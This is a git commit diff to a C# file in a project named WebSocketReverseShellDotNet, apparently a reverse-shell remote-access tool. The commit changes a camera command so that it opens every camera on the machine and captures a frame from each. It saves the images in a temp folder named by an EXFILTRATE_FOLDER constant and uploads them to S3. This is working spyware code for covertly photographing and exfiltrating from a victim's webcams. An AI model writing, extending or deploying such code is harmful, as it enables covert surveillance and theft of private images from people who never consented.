98a6906a44c29c59d2a76cc31c1e574c5ca1bd57
Mohammed Hattab <mohammedhattab97@gmail.com>
2024-01-03 21:49:21 -0500

    changed camera command to capture all cameras instead of the default one

--- service/commands/CameraScreenShot.cs
+++ service/commands/CameraScreenShot.cs
@@ -21,62 +21,85 @@ namespace WebSocketReverseShellDotNet.service.commands
     public class CameraScreenShot : Command
     {
 
+        public static int GetNumberOfCameras()
+        {
+            int numberOfCameras = 0;
 
+            while (true)
+            {
+                using (var capture = new VideoCapture(numberOfCameras))
+                {
+                    if (capture.IsOpened)
+                    {
+                        numberOfCameras++;
+                    }
+                    else
+                    {
+                        break; // Camera with the current index could not be opened, stop searching
+                    }
+                }
+            }
+
+            return numberOfCameras;
+        }
 
 
         public string ExecuteCommand(string command)
         {
             StringBuilder sb = new StringBuilder();
 
-            try
+
+            // Specify the desired resolution
+            int width = 1920; // adjust as needed
+            int height = 1080; // adjust as needed
+            Console.WriteLine("Number of cameras: " + GetNumberOfCameras());
+            for (int cameraIndex = 0; cameraIndex < GetNumberOfCameras(); cameraIndex++) // numberOfCameras should be set to the number of cameras available
             {
-                // Specify the desired resolution
-                int width = 1920; // adjust as needed
-                int height = 1080; // adjust as needed
-
-                // Initialize camera capture with specified resolution
-                using (var capture = new VideoCapture(0))
+                try
                 {
-                    // Check if the capture device is opened successfully
-                    if (!capture.IsOpened)
+                    // Initialize camera capture with specified resolution
+                    using (var capture = new VideoCapture(cameraIndex))
                     {
-                        sb.AppendLine("Error: Could not open camera.");
-                        return sb.ToString();
+                        // Check if the capture device is opened successfully
+                        if (!capture.IsOpened)
+                        {
+                            sb.AppendLine("Error: Could not open camera.");
+                            return sb.ToString();
 
+                        }
+
+                        // Set the resolution
+                        capture.Set(CapProp.FrameWidth, width);
+                        capture.Set(CapProp.FrameHeight, height);
+
+                        // Capture a frame
+                        Mat frame = new Mat();
+                        capture.Read(frame);
+
+                        OSUtil.CreateDirectoryInTmpFolder(Constants.EXFILTRATE_FOLDER);
+
+                        String path = OSUtil.GetSystemTempDir() + Constants.EXFILTRATE_FOLDER + "\\" +
+                            $"captured_image_{cameraIndex}_{DateTime.Now:yyyyMMdd_HHmmss}.jpg";
+
+                        // Save the frame as an image file (JPEG format in this example)
+
+                        CvInvoke.Imwrite(path, frame);
+
+                        sb.Append($"Image captured and saved as {path} ");
+                        FileInfo fileToUpload = new FileInfo(path);
+                        sb.AppendLine(S3Uploadutil.UploadToS3(fileToUpload));
                     }
-
-                    // Set the resolution
-                    capture.Set(CapProp.FrameWidth, width);
-                    capture.Set(CapProp.FrameHeight, height);
-
-                    // Capture a frame
-                    Mat frame = new Mat();
-                    capture.Read(frame);
-
-                    OSUtil.CreateDirectoryInTmpFolder(Constants.EXFILTRATE_FOLDER);
-
-                    String path = OSUtil.GetSystemTempDir()+ Constants.EXFILTRATE_FOLDER + "\\" +
-                        $"captured_image_{DateTime.Now:yyyyMMdd_HHmmss}.jpg";
-
-                    // Save the frame as an image file (JPEG format in this example)
-                    
-                    CvInvoke.Imwrite(path, frame);
-
-                    sb.Append($"Image captured and saved as {path} ");
-                    FileInfo fileToUpload = new FileInfo(path);
-
-                    sb.AppendLine(S3Uploadutil.UploadToS3(fileToUpload));
-
+                }
+                catch (Exception ex)
+                {
+                    sb.AppendLine(ex.StackTrace);
+                    sb.AppendLine("error while saving cameraShot: " + ex.Message);
+                    return sb.ToString();
                 }
 
             }
-                
-            catch (Exception ex)
-            {
-                sb.AppendLine(ex.StackTrace);
-                sb.AppendLine("error while saving cameraShot: " + ex.Message);
-                return sb.ToString();
-            }
+            
+ 
 
             return sb.ToString();
 
